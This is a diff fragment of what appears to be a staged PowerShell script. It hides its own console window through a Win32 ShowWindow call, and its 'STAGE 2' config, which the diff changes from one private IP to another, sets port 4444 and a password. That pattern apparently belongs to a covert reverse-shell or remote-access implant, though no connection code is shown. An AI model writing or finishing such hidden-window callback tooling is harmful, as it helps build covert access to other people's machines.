@@ -12,7 +12,7 @@ $api = Add-Type -Name Win32 -MemberDefinition @'
 $api::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)
 
 # --- STAGE 2: CONFIG ---
-$ip = '172.20.10.3'
+$ip = '192.168.1.15'
 $port = 4444
 $pass = "biskviti"
 
